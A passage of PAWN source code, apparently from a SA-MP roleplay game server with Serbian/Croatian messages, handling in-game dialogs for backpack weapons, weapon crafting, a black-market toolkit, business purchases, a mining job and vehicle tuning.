			if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_BACKPACKTAKEGUN_3, DIALOG_STYLE_INPUT, "Torba - Gun 3", "{FFFFFF}* Unesite kolicinu metaka koliko zelite uzeti iz torbe:", "Potvrdi", "Odustani" );
	       	if( kolicina < 1 || kolicina > 100 ) return SendErrorMessage( playerid, "Ne mozete manje od 1 i vise od 100 odjednom.");
	       	if( PlayerInfo[playerid][xTorba_OruzjeM][2] < kolicina ) return SendErrorMessage( playerid, "Nemate toliko metaka u torbi.");

			GiveWeaponToPlayer( playerid, PlayerInfo[playerid][xTorba_Oruzje][2], kolicina);
			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s vadi %s iz torbe.", ImeIgraca( playerid ), WeaponInfos[ PlayerInfo[playerid][xTorba_Oruzje][2] ][ wName ] );
			SendInfoMessage( playerid, "Izvadili ste iz torbe %s.", WeaponInfos[ PlayerInfo[playerid][xTorba_Oruzje][2] ][ wName ] );

			PlayerInfo[playerid][xTorba_OruzjeM][2] -= kolicina;
			if(PlayerInfo[playerid][xTorba_OruzjeM][2] == 0) PlayerInfo[playerid][xTorba_Oruzje][2] = 0;
            sql_user_update_integer(playerid, "xTorba_Oruzje_3", PlayerInfo[playerid][xTorba_Oruzje][2]);
            sql_user_update_integer(playerid, "xTorba_OruzjeM_3", PlayerInfo[playerid][xTorba_OruzjeM][2]);			
		}
	}
	else if(dialogid == dialog_MAKEGUN )
	{
		if( !response ) return 1;
		if( response )
		{
		    new name[ 32 ], ammo = 0, mats = 0;
		    switch( listitem )
			{
		        case 0:
				{
		            ammo = 1;
		            mats = 400;
		            strmid( name, "Palicu", 0, strlen( "Palicu" ), 32);
		        }
		        case 1:
				{
		            ammo = 1;
		            mats = 1500;
		            strmid( name, "Noz", 0, strlen( "Noz" ), 32);
		        }
		        case 2:
				{
		            ammo = 100;
		            mats = 2500;
		            strmid( name, "Colt", 0, strlen( "Colt" ), 32);
		        }
		        case 3:
				{
		            ammo = 100;
		            mats = 7000;
		            strmid( name, "Deagle", 0, strlen( "Deagle" ), 32);
		        }
		        case 4:
				{
		            ammo = 100;
		            mats = 10000;
		            strmid( name, "Shotgun", 0, strlen( "Shotgun" ), 32);
		        }
		        case 5:
				{
		            ammo = 200;
		            mats = 11000;
		            strmid( name, "MP5", 0, strlen( "MP5" ), 32);
		        }
		        case 6:
				{
		            ammo = 150;
		            mats = 11500;
		            strmid( name, "AK47", 0, strlen( "AK47" ), 32);
		        }
		        case 7:
				{
		            ammo = 150;
		            mats = 12000;
		            strmid( name, "M16", 0, strlen( "M16" ), 32);
		        }
		        case 8:
				{
		            ammo = 50;
		            mats = 18000;
		            strmid( name, "Sniper", 0, strlen( "Sniper" ), 32);
		        }
		    }
			if( ammo == 0 || mats == 0 ) return 1;
			ChosenWeapon[ playerid ] = listitem+1;

		    format( globalstring, sizeof( globalstring ), "{FFFFFF}* Da li ste sigurni da zelite da napravite %s sa %d metak/a za %d materijala?", name, ammo, mats);
		    ShowPlayerDialog( playerid, dialog_MAKEGUN_1, DIALOG_STYLE_MSGBOX, D_NASLOV, globalstring, "Da", "Ne" );

		}
	}
	else if(dialogid == dialog_MAKEGUN_1 )
	{
		if( !response ) return 1;
		if( response )
		{
		    new name[ 32 ], ammo = 0, mats = 0, weapon_id = 0;

            if( ChosenWeapon[ playerid ] == 0 ) return 1;
		    switch( (ChosenWeapon[ playerid ]-1) )
			{
		        case 0:
				{
		            weapon_id = 5;
		            ammo = 1;
		            mats = 400;
		            strmid( name, "Palicu", 0, strlen( "Palicu" ), 32);
		        }
		        case 1:
				{
		            weapon_id = 4;
		            ammo = 1;
		            mats = 1500;
		            strmid( name, "Noz", 0, strlen( "Noz" ), 32);
		        }
		        case 2:
				{
		            weapon_id = 22;
		            ammo = 100;
		            mats = 2500;
		            strmid( name, "Colt", 0, strlen( "Colt" ), 32);
		        }
		        case 3:
				{
		            weapon_id = 24;
		            ammo = 100;
		            mats = 7000;
		            strmid( name, "Deagle", 0, strlen( "Deagle" ), 32);
		        }
		        case 4:
				{
		            weapon_id = 25;
		            ammo = 100;
		            mats = 10000;
		            strmid( name, "Shotgun", 0, strlen( "Shotgun" ), 32);
		        }
		        case 5:
				{
		            weapon_id = 29;
		            ammo = 200;
		            mats = 11000;
		            strmid( name, "MP5", 0, strlen( "MP5" ), 32);
		        }
		        case 6:
				{
		            weapon_id = 30;
		            ammo = 150;
		            mats = 11500;
		            strmid( name, "AK47", 0, strlen( "AK47" ), 32);
		        }
		        case 7:
				{
		            weapon_id = 31;
		            ammo = 150;
		            mats = 12000;
		            strmid( name, "M16", 0, strlen( "M16" ), 32);
		        }
		        case 8:
				{
		            weapon_id = 34;
		            ammo = 50;
		            mats = 18000;
		            strmid( name, "Sniper", 0, strlen( "Sniper" ), 32);
		        }
		    }
			if( ammo == 0 || mats == 0 ) return 1;

		    if( PlayerInfo[ playerid ][ xMaterijali ] < mats ) return SendErrorMessage(playerid, "Nemas dovoljno materijala (%d).", mats );

			PlayerInfo[ playerid ][ xMaterijali ] -= mats;
			sql_user_update_integer( playerid, "materials", PlayerInfo[ playerid ][ xMaterijali ] );
			GiveWeaponToPlayer( playerid, weapon_id, ammo );

			SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s je napravio %s.", ImeIgraca( playerid ), name );
            SCMF(playerid, 0x00FF00FF, "(ORUZJE): Napravili ste oruzje {FFFFFF}%s {00FF00}sa {FFFFFF}(%d) {00FF00}metak/a, potrosili ste {FFFFFF}(%d) {00FF00}materijala.", name, ammo, mats );

			ChosenWeapon[ playerid ] = 0;
		}
	}
	else if(dialogid == dialog_BLACKMARKET )
	{
		if( !response ) return 1;
		if( response )
		{
		    switch( listitem )
			{
		        case 0:
				{
		            if( PlayerInfo[ playerid ][ xToolkit ] == 0 )
					{
					    if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemas dovoljno novca." );
						SendInfoMessage( playerid, "Kupio si alat za obijanje za 500$." );
						PlayerInfo[ playerid ][ xToolkit ] = 1;
						sql_user_update_integer( playerid, "toolkit", PlayerInfo[ playerid ][ xToolkit ] );
						DajIgracuNovac( playerid, -500 );
					}
					else SendErrorMessage( playerid, "Vec imas alat za obijanje!");
		        }
		    }
		}
	}
	else if(dialogid == dialog_LEADERBUYBIZZ )
	{
	    new id = GetNearestBussines( playerid );
		if( id == -1) return SendErrorMessage( playerid, "Niste blizu firme!" );
		if( BusinessInfo[ id ][ bOwner_sqlID ] != -1 || BusinessInfo[ id ][ bPrice ] == 0 || BusinessInfo[ id ][ bOwnerOrg ] != -1 ) return SendErrorMessage( playerid, "Ova firma se ne prodaje!");
	    if( PlayerInfo[ playerid ][ xNovac ] < BusinessInfo[ id ][ bPrice ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca za kupovinu Firme!");
	    if( PlayerInfo[ playerid ][ xLevel ] < BusinessInfo[ id ][ bLevel ] ) return SCMF( playerid, CRVENA, "(FIRMA): {FFFFFF}Morate biti level %d+ da bi ste kupili firmu.", BusinessInfo[ id ][ bLevel ] );

	    if( !response )
		{
	        new OrgID = PlayerInfo[ playerid ][ xLider ];
	        if( org_info[ OrgID ][ oBussinesID ] != -1 ) return SendErrorMessage( playerid, "Vasa organizacija vec poseduje firmu!");

			org_info[ OrgID ][ oEntFromBussines ] = -1;
            org_info[ OrgID ][ oBussinesID ] = id;

			DajIgracuNovac( playerid, -BusinessInfo[ id ][ bPrice ] );
			BusinessInfo[ id ][ bLocked ] = 0;
			BusinessInfo[ id ][ bNeaktivnost ] = 0;
			BusinessInfo[ id ][ bFacture ] = 100;
			BusinessInfo[ id ][ bOwnerOrg ] = OrgID;
			Bussines_Refresh( id );

			new q[ 256 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
					BusinessInfo[ id ][ bOwner_sqlID ],
					BusinessInfo[ id ][ bNeaktivnost ],
					BusinessInfo[ id ][ bFacture ], BusinessInfo[ id ][ b_ID ] );

			mysql_tquery( mSQL, q );

            sql_organization_update_integer( OrgID, "owned_business", BusinessInfo[ org_info[ OrgID ][ oBussinesID ] ][ b_ID ] );
			SendInfoMessage( playerid, "Kupili ste firmu za organizaciju kucajte [ /lider ] za upravljanje, cestitamo!" );
		}
	    else
		{
			if( PlayerInfo[ playerid ][ xFirmaID ] != -1 ) return SendErrorMessage( playerid, "Vec posedujes firmu!");

			PlayerInfo[ playerid ][ xFirmaID ] = id;
			PlayerInfo[ playerid ][ xBussinesSqlID ] = BusinessInfo[ id ][ b_ID ];
			DajIgracuNovac( playerid, -BusinessInfo[ id ][bPrice] );
			BusinessInfo[ id ][ bLocked ] = 0;
			BusinessInfo[ id ][ bNeaktivnost ] = 0;
			BusinessInfo[ id ][ bFacture ] = 100;
			BusinessInfo[ id ][ bOwner_sqlID ] = PlayerInfo[ playerid ][ xID ];
			strmid( BusinessInfo[ id ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
			Bussines_Refresh( id );

			new q[ 256 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
					BusinessInfo[ id ][ bOwner_sqlID ],
					BusinessInfo[ id ][ bOwner ],
					BusinessInfo[ id ][ bNeaktivnost ],
					BusinessInfo[ id ][ bFacture ], BusinessInfo[ id ][ b_ID ] );

			mysql_tquery( mSQL, q );

			sql_user_update_integer( playerid, "bussines_id", PlayerInfo[ playerid ][ xBussinesSqlID ] );
			SendInfoMessage( playerid, "Kupili ste firmu, cestitamo!" );
			SendClientMessage( playerid, 0xFF4500FF, "UKOLIKO VAM FAKTURE DODJU NA 0, FIRMA CE SE PRODATI AUTOMATSKI!" );
	    }

	    if(questInfo[playerid][qt_EasyQuest][7] == false) {
	        questInfo[playerid][qt_EasyQuest][7] = true;
	        sql_UpdateQuest(playerid);

	        KillTimer(QuestTimer[playerid]);
	        quest_CreateTDs(playerid, false);

	        quest_CreateTDs(playerid, true);
	        PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.8");
	        PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");

	        QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
	    }
	}
	else if(dialogid == dialog_RUDAR)
	{
	    if(response)
	    {
	        if( UzeoOpremu[ playerid ] == false ) return SendErrorMessage( playerid, "Nemate opremu!" );
			new uhvatio = random(5);
			if(uhvatio == 2 && AccountVerified[ playerid ] == false) return SendErrorMessage( playerid, "Morate obnoviti verifikaciju {FFFFFF}[ /vf ].");
			if( PosaoRudar[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec ste poceli sa poslom." );

            new randomruda = (random(14) + 1);
			SMG_SetPlayerCheckpoint( playerid, RandomRudnik[ randomruda ][ 0 ], RandomRudnik[ randomruda ][ 1 ], RandomRudnik[ randomruda ][ 2 ], 2.5 );
			CheckpointStatus[ playerid ] = 32;
			SendJobMessage( playerid, "Nastavili ste sa kopanjem ruda, mesto za kopanje je oznaceno crveno na mapi." );
			PosaoRudar[ playerid ] = 1;
			AccountVerified[ playerid ] = false;
	    }
	    else return SendJobMessage(playerid, "Odustali ste od daljnjeg kopanja, ako zelite opet kopati kucajte [ /posao ].");
	}
	else if(dialogid == dialog_TUNING )
	{
	        if( response )
			{
	            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
	            if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );
				new vehicleid = GetPlayerVehicleID( playerid ), Float:Pos[ 6 ];

	            TPInfo[ playerid ][ tID ] = -1;

				switch( listitem )
				{
	                case 0:
					{
						for( new i = 0; i < NUMBER_TYPE_PAINTJOB; i++ )
						{
			                if( pjInfo[ i ][ vehID ] == GetVehicleModel( vehicleid ) )
							{
				            	TPInfo[ playerid ][ tID ] = i;
								break;
							}
			           	}
						if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih boja za vas model auta." );

						new pid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tPaintjob ] = true;

						GetVehicleColor( vehicleid, TPInfo[ playerid ][ PJColor ][ 0 ], TPInfo[ playerid ][ PJColor ][ 1 ] );

						SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        SMG_ChangeVehicleColor( vehicleid, 1, 1 );
                        ChangeVehiclePaintjob( vehicleid, pjInfo[ pid ][ pNumber ] );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Paintjobs" );
	                    format( globalstring, sizeof( globalstring ), "%s", pjInfo[ pid ][ pNameBre ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", pjInfo[ pid ][ pPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 4, 0, 5 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
					}
	                case 1:
					{
						ShowPlayerDialog( playerid, dialog_TUNING_2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesi ID boje 1 i ID boje 2 boje koje zelis za svoje auto.\nFormat: 0 1", "Potvrdi", "Odustani" );
	                }
	                case 2:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_EXHAUST )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_EXHAUST;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Exhausts" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], -2, -5, 0 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	                case 3:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_FRONT_BUMPER )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_FRONT_BUMPER;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Front Bumper" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, 6, 0.5 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	                case 4:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_REAR_BUMPER )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_REAR_BUMPER;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Rear Bumper" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, -6, 0.5 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	                case 5:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_ROOF )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_ROOF;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Roof" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, 6, 2 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	                case 6:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_SPOILER )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_SPOILER;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Spoilers" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, -6, 2 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	                case 7:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_SIDESKIRT )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_SIDESKIRT;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Side Skirts" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 4, 0, 0.5 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	                case 8:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_WHEELS )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_WHEELS;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Wheels" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
						}
						else
						{
							PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
						}

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 4, 0, 0.5 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, 0xFFFFFFFF );
	                }
	                case 9:
					{
	                    for( new i = 0; i < MAX_COMPONENTS; i++ )
						{
			                if( cInfo[ i ][ cType ] == CARMODTYPE_STEREO )
							{
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
								{
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_STEREO;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    SMG_TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 4 ], "Car Stereo" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

						if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
						{
						    new str[20];
							format( str, sizeof( str ), "Kupi($%d)", cInfo[ cid ][ cPrice ] );
